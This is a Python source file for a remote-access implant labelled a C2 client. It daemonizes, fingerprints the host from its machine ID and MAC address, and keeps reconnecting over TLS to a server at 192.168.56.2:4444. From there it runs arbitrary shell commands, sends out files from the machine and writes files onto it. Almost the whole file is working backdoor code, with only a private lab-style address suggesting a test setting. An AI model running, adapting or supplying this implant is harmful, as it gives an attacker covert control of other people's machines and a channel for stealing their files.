# ======================== IMPORTS ========================
import os,socket,subprocess,sys,time,ssl,platform,hashlib,uuid

# ======================== CONFIGURATION ========================
CHUNK_SIZE = 262144  # 256 KB
PID_FILE = "/tmp/c2client.pid"
MAX_OUTPUT_SIZE = 500000  # 500KB max output
COMMAND_TIMEOUT = 300  # 5 minutes
CHUNK_SIZE_OUTPUT = 65536  # 64KB chunks
SERVER_HOST = '192.168.56.2'
SERVER_PORT = 4444
SERVER_CERT = "server.crt"

# ======================== CLIENT FINGERPRINT HELPERS ========================
def _get_machine_id():
    """Get machine ID from various locations."""
    machine_id_paths = ['/etc/machine-id', '/var/lib/dbus/machine-id']
    
    for path in machine_id_paths:
        try:
            with open(path, 'r') as f:
                return f.read().strip()
        except:
            continue
    
    return str(uuid.uuid4())

def _format_mac_address():
    """Format MAC address from UUID."""
    node = uuid.getnode()
    mac_bytes = []
    for elements in range(0, 8*6, 8):
        byte = (node >> elements) & 0xff
        mac_bytes.append('{:02x}'.format(byte))
    return ':'.join(mac_bytes[::-1])

def get_client_fingerprint():
    """Generate unique fingerprint for this client."""
    fingerprint_data = {
        "hostname": platform.node(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "system": platform.system(),
        "release": platform.release(),
        "mac_address": _format_mac_address(),
        "machine_id": _get_machine_id(),
    }
    
    fingerprint_str = str(sorted(fingerprint_data.items()))
    fingerprint_hash = hashlib.sha256(fingerprint_str.encode()).hexdigest()[:16]
    return fingerprint_hash, fingerprint_data

# ======================== NETWORK HELPERS ========================
def client_recv_line(sock: socket.socket) -> str | None:
    """Receive a line from socket."""
    data = b""
    while True:
        try:
            chunk = sock.recv(1)
            if not chunk:
                return None if not data else data.decode("utf-8", errors="ignore")
            if chunk == b"\n":
                break
            data += chunk
        except socket.timeout:
            continue
        except (ConnectionError, OSError):
            return None
    return data.decode("utf-8", errors="ignore").strip()

def client_recv_exact(sock: socket.socket, size: int) -> bytes:
    """Receive exact number of bytes."""
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(min(CHUNK_SIZE, size - len(data)))
        if not chunk:
            raise ConnectionError("Connection closed while receiving file data")
        data += chunk
    return bytes(data)

# ======================== FILE TRANSFER HELPERS ========================
def _parse_file_header(header):
    """Parse FILE command header."""
    if not header:
        return None, None
    
    parts = header.split()
    if len(parts) != 3 or parts[0] != "FILE":
        return None, None
    
    try:
        return parts[1], int(parts[2])
    except ValueError:
        return None, None

def client_receive_file(sock: socket.socket, header: str):
    """Receive file from server."""
    filename, size = _parse_file_header(header)
    if not filename or size is None:
        return
    
    with open(filename, "wb") as f:
        received = 0
        while received < size:
            chunk_size = min(CHUNK_SIZE, size - received)
            chunk = sock.recv(chunk_size)
            if not chunk:
                break
            f.write(chunk)
            received += len(chunk)
    
    sock.sendall(b"RECVOK\n")

def client_send_file(sock: socket.socket, filename: str):
    """Send file to server."""
    if not os.path.isfile(filename):
        sock.sendall(f"[!] File not found: {filename}\n".encode())
        return
    
    size = os.path.getsize(filename)
    sock.sendall(f"FILE {os.path.basename(filename)} {size}\n".encode())
    
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)
    
    sock.sendall(b"RECVOK\n")
    
    try:
        response = client_recv_line(sock)
        if response == "RECVOK":
            pass
    except:
        pass

# ======================== DAEMON HANDLING ========================
def _setup_daemon_io():
    """Setup daemon I/O redirection."""
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open('/dev/null', 'rb', 0) as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    
    with open('/dev/null', 'ab', 0) as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

def daemonize():
    """Daemonize the process."""
    try:
        if os.fork() > 0:
            sys.exit(0)
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
        
        _setup_daemon_io()
        os.chdir('/')
        os.umask(0) 
        
    except OSError as e:
        print(f"[!] Daemonize failed: {e}")
        sys.exit(1)

def write_pid():
    """Write PID file."""
    if os.path.exists(PID_FILE):
        print("[!] Already running?")
        sys.exit(1)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

# ======================== COMMAND EXECUTION ========================
def _execute_command(command):
    """Execute shell command with timeout."""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True,
            timeout=COMMAND_TIMEOUT
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"[!] Command timed out after {COMMAND_TIMEOUT} seconds\n"
    except Exception as e:
        return f"[!] Command error: {e}\n"

def _prepare_output(output):
    """Prepare output for sending."""
    if len(output) > MAX_OUTPUT_SIZE:
        truncated = output[:MAX_OUTPUT_SIZE]
        output = truncated + f"\n[... Output truncated. Total was {len(output)} bytes ...]\n"
    
    if not output.strip():
        output = "[*] Command executed. No output.\n"
    
    return output

def _send_output_in_chunks(sock, output):
    """Send output in manageable chunks."""
    for i in range(0, len(output), CHUNK_SIZE_OUTPUT):
        chunk = output[i:i+CHUNK_SIZE_OUTPUT]
        sock.sendall(chunk.encode("utf-8"))
        time.sleep(0.001)

# ======================== TLS CONTEXT ========================
def build_tls_context():
    """Build TLS context for client."""
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.load_verify_locations(SERVER_CERT)
    ctx.check_hostname = False
    return ctx

TLS_CONTEXT = build_tls_context()

# ======================== CONNECTION HANDLING ========================
def _handle_special_commands(client, command):
    """Handle special commands like cd, FILE, PULL."""
    if command.startswith("FILE "):
        client_receive_file(client, command)
        return True
    elif command.startswith("PULL "):
        filename = command[5:].strip()
        client_send_file(client, filename)
        return True
    elif command == "RECVOK":
        return True
    elif command.startswith("cd "):
        path = command[3:].strip()
        try:
            os.chdir(path)
            client.sendall(f"Changed directory to {os.getcwd()}\n".encode())
        except Exception as e:
            client.sendall(f"cd error: {e}\n".encode())
        return True
    return False

def _process_command_loop(client):
    """Process commands from server."""
    fingerprint, _ = get_client_fingerprint()
    client.sendall(f"FINGERPRINT {fingerprint}\n".encode())
    
    try:
        subprocess.Popen(['xterm', '-e', 'echo Hello && bash'])
    except Exception as e:
        print(f"[!] Could not open terminal: {e}")
    
    while True:
        try:
            command = client_recv_line(client)
            if command is None:
                break
            
            if _handle_special_commands(client, command):
                continue
            
            output = _execute_command(command)
            prepared_output = _prepare_output(output)
            _send_output_in_chunks(client, prepared_output)
            
        except socket.timeout:
            try:
                client.sendall(b"\n")
            except:
                break
            continue
        except Exception as e:
            print(f"[!] Command loop error: {e}")
            break

def connect_to_server():
    """Main connection loop to server."""
    while True:
        client = None
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(10)
            raw.connect((SERVER_HOST, SERVER_PORT))
            
            client = TLS_CONTEXT.wrap_socket(raw, server_hostname='C2Server')
            client.settimeout(30)
            
            _process_command_loop(client)
            
        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)
        finally:
            if client is not None:
                try:
                    client.close()
                except:
                    pass

# ======================== ENTRY POINT ========================
if __name__ == "__main__":
    daemonize()
    write_pid()
    connect_to_server()